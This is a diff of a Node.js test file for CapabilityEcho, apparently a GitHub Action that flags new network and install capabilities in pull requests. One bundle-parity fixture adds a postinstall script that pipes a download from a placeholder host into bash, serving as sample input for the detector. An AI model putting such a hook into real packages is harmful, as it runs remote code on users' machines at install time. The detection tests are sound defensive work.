@@ -1,10 +1,11 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 import { execFile } from 'node:child_process';
-import { readFile, writeFile } from 'node:fs/promises';
+import { readdir, readFile, writeFile } from 'node:fs/promises';
 import { fileURLToPath } from 'node:url';
 import { dirname, join } from 'node:path';
 import { promisify } from 'node:util';
+import YAML from 'yaml';
 import { makeGitRepo } from 'agent-gov-core/test-utils';
 
 const execFileAsync = promisify(execFile);
@@ -16,6 +17,9 @@ test('action.yml exposes capability drift outputs', async () => {
   assert.match(action, /name: CapabilityEcho/);
   assert.match(action, /has-findings/);
   assert.match(action, /changed-file-count/);
+  assert.match(action, /analysis-incomplete/);
+  assert.match(action, /analysis-diagnostic-count/);
+  assert.match(action, /analysis-diagnostics/);
   assert.match(action, /surface-summary/);
   assert.match(action, /severity-summary/);
   assert.match(action, /capability-summary/);
@@ -27,6 +31,9 @@ test('action.yml exposes capability drift outputs', async () => {
   assert.match(action, /max-findings/);
   assert.match(action, /max-output-bytes/);
   assert.match(action, /report-file/);
+  assert.match(action, /exceptions-file/);
+  assert.match(action, /suppressed-finding-count/);
+  assert.match(action, /expired-exception-count/);
 });
 
 test('action.yml runs the checked-in JavaScript action without installing PR-local scripts first', async () => {
@@ -60,12 +67,87 @@ test('self-dogfood workflow uses the trusted repository action instead of PR-loc
   assert.match(workflow, /fetch-depth: 0/);
 });
 
+test('repository workflows pin external Actions and set job timeouts', async () => {
+  const workflowDir = join(packageRoot, '.github', 'workflows');
+  const workflowNames = (await readdir(workflowDir)).filter((name) => /\.ya?ml$/i.test(name));
+  assert.ok(workflowNames.length > 0, 'expected workflow files');
+
+  for (const name of workflowNames) {
+    const workflow = await readFile(join(workflowDir, name), 'utf8');
+    const parsed = YAML.parse(workflow);
+    for (const [jobName, job] of Object.entries(parsed.jobs ?? {})) {
+      assert.ok(job['timeout-minutes'], `${name} job ${jobName} must set timeout-minutes`);
+    }
+
+    for (const match of workflow.matchAll(/^\s*-\s+uses:\s+([^#\s]+)/gm)) {
+      const ref = match[1];
+      if (ref === 'Conalh/CapabilityEcho@main') {
+        assert.match(workflow, /trusted public baseline/, 'self-dogfood @main exception must be documented');
+        continue;
+      }
+      assert.match(ref, /@[a-f0-9]{40}$/i, `${name} uses mutable Action ref ${ref}`);
+    }
+  }
+});
+
+test('CI workflow exercises supported Node versions, Windows paths, and the candidate bundle', async () => {
+  const workflow = await readFile(join(packageRoot, '.github/workflows/ci.yml'), 'utf8');
+
+  assert.match(workflow, /node-version:\s+\[\s*22,\s*24\s*\]/);
+  assert.match(workflow, /node-version:\s+\$\{\{\s*matrix\.node-version\s*\}\}/);
+  assert.match(workflow, /runs-on:\s+windows-latest/);
+  assert.match(workflow, /node --test test\/git-diff\.test\.mjs/);
+  assert.match(workflow, /node dist\/action-bundle\/index\.js/);
+  assert.doesNotMatch(workflow, /node dist\/action\.js/);
+});
+
 function projectFiles({ packageJson, source }) {
   return {
     'package.json': `${JSON.stringify(packageJson, null, 2)}\n`,
     'src/client.ts': source,
   };
 }
+
+test('bundled Action entrypoint matches the unbundled Action behavior', async () => {
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-bundle-parity-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'bundle-parity-fixture', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+
+  try {
+    const base = await fx.head();
+    const head = await fx.commit(
+      projectFiles({
+        packageJson: {
+          name: 'bundle-parity-fixture',
+          private: true,
+          scripts: {
+            test: 'vitest',
+            postinstall: 'curl https://install.example.com/setup.sh | bash'
+          }
+        },
+        source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
+      }),
+      'add capability drift'
+    );
+
+    const unbundled = await runActionEntrypoint('dist/action.js', fx.repo, base, head, 'unbundled');
+    const bundled = await runActionEntrypoint('dist/action-bundle/index.js', fx.repo, base, head, 'bundled');
+
+    assert.equal(bundled.code, 0);
+    assert.equal(bundled.stdout, unbundled.stdout);
+    assert.equal(bundled.summary, unbundled.summary);
+    assert.equal(bundled.outputs, unbundled.outputs);
+    assert.equal(bundled.parsedOutputs.get('report-json'), unbundled.parsedOutputs.get('report-json'));
+    assert.match(bundled.stdout, /::warning file=src\/client\.ts,line=2/);
+  } finally {
+    await fx.cleanup();
+  }
+});
 
 test('JavaScript action entrypoint emits outputs, summary, and GitHub annotations', async () => {
   const fx = await makeGitRepo({
@@ -117,6 +199,9 @@ test('JavaScript action entrypoint emits outputs, summary, and GitHub annotation
     assert.match(outputs, /^has-findings=true$/m);
     assert.match(outputs, /^finding-count=4$/m);
     assert.match(outputs, /^changed-file-count=2$/m);
+    assert.match(outputs, /^analysis-incomplete=false$/m);
+    assert.match(outputs, /^analysis-diagnostic-count=0$/m);
+    assert.match(outputs, /^analysis-diagnostics=\[\]$/m);
     assert.match(outputs, /^surface-summary=\{"source":1,"package":3,"workflow":0,"container":0\}$/m);
     assert.match(outputs, /^severity-summary=\{"critical":1,"high":1,"medium":2,"low":0\}$/m);
     assert.match(
@@ -136,6 +221,10 @@ test('JavaScript action entrypoint emits outputs, summary, and GitHub annotation
       'hasFindings',
       'findingCount',
       'changedFileCount',
+      'analysisIncomplete',
+      'analysisDiagnosticCount',
+      'suppressedFindingCount',
+      'expiredExceptionCount',
       'surfaceSummary',
       'severitySummary',
       'capabilitySummary',
@@ -143,6 +232,8 @@ test('JavaScript action entrypoint emits outputs, summary, and GitHub annotation
     ]);
     assert.equal(adoptionEvidence.rating, 'critical');
     assert.equal(adoptionEvidence.hasFindings, true);
+    assert.equal(adoptionEvidence.analysisIncomplete, false);
+    assert.equal(adoptionEvidence.analysisDiagnosticCount, 0);
     assert.deepEqual(adoptionEvidence.surfaceSummary, { source: 1, package: 3, workflow: 0, container: 0 });
     assert.equal('findings' in adoptionEvidence, false);
     const jsonReport = JSON.parse(parsedOutputs.get('report-json') ?? '{}');
@@ -203,6 +294,72 @@ test('JavaScript action emits has-findings false for clean changed diffs', async
     assert.match(outputs, /^changed-file-count=1$/m);
     assert.match(outputs, /^capability-summary=\[\]$/m);
     assert.match(summary, /No code or workflow capability drift findings\./);
+  } finally {
+    await fx.cleanup();
+  }
+});
+
+test('JavaScript action applies checked-in exceptions and emits suppression metadata', async () => {
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-exceptions-action-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'exception-action-fixture', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+  const outputPath = join(fx.repo, 'github-output.txt');
+  const summaryPath = join(fx.repo, 'github-summary.md');
+
+  try {
+    const base = await fx.head();
+    const head = await fx.commit(
+      {
+        ...projectFiles({
+          packageJson: { name: 'exception-action-fixture', private: true, scripts: { test: 'vitest' } },
+          source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
+        }),
+        '.capabilityecho-exceptions.json': `${JSON.stringify({
+          exceptions: [
+            {
+              kind: 'capability_echo.external_fetch_added',
+              pathPrefix: 'src/',
+              expires: '2099-01-01',
+              reason: 'approved external API migration'
+            }
+          ]
+        }, null, 2)}\n`
+      },
+      'add suppressed capability drift'
+    );
+
+    await execFileAsync(process.execPath, ['dist/action.js'], {
+      cwd: packageRoot,
+      env: {
+        ...process.env,
+        INPUT_REPO: fx.repo,
+        INPUT_BASE: base,
+        INPUT_HEAD: head,
+        INPUT_FAIL_ON: 'medium',
+        GITHUB_OUTPUT: outputPath,
+        GITHUB_STEP_SUMMARY: summaryPath
+      }
+    });
+
+    const outputs = await readFile(outputPath, 'utf8');
+    const summary = await readFile(summaryPath, 'utf8');
+    const parsedOutputs = parseGithubOutputs(outputs);
+    const jsonReport = JSON.parse(parsedOutputs.get('report-json') ?? '{}');
+    const adoptionEvidence = JSON.parse(parsedOutputs.get('adoption-evidence') ?? '{}');
+
+    assert.match(outputs, /^rating=none$/m);
+    assert.match(outputs, /^has-findings=false$/m);
+    assert.match(outputs, /^finding-count=0$/m);
+    assert.match(outputs, /^suppressed-finding-count=1$/m);
+    assert.match(outputs, /^expired-exception-count=0$/m);
+    assert.equal(jsonReport.data.suppressedFindingCount, 1);
+    assert.equal(adoptionEvidence.suppressedFindingCount, 1);
+    assert.match(summary, /Suppressed by active exceptions: 1/);
   } finally {
     await fx.cleanup();
   }
@@ -564,6 +721,39 @@ test('JavaScript action reports missing git refs without a stack trace', async (
     await fx.cleanup();
   }
 });
+
+async function runActionEntrypoint(entrypoint, repo, base, head, suffix) {
+  const outputPath = join(repo, `github-output-${suffix}.txt`);
+  const summaryPath = join(repo, `github-summary-${suffix}.md`);
+  const result = await execFileAsync(process.execPath, [entrypoint], {
+    cwd: packageRoot,
+    env: {
+      ...process.env,
+      INPUT_REPO: repo,
+      INPUT_BASE: base,
+      INPUT_HEAD: head,
+      INPUT_FAIL_ON: 'none',
+      GITHUB_OUTPUT: outputPath,
+      GITHUB_STEP_SUMMARY: summaryPath
+    }
+  }).then(
+    ({ stdout, stderr }) => ({ code: 0, stdout, stderr }),
+    (error) => ({
+      code: typeof error === 'object' && error && 'code' in error ? error.code : undefined,
+      stdout: typeof error === 'object' && error && 'stdout' in error ? String(error.stdout) : '',
+      stderr: typeof error === 'object' && error && 'stderr' in error ? String(error.stderr) : ''
+    })
+  );
+  const outputs = await readFile(outputPath, 'utf8');
+  const summary = await readFile(summaryPath, 'utf8');
+
+  return {
+    ...result,
+    outputs,
+    summary,
+    parsedOutputs: parseGithubOutputs(outputs)
+  };
+}
 
 function parseGithubOutputs(content) {
   const outputs = new Map();
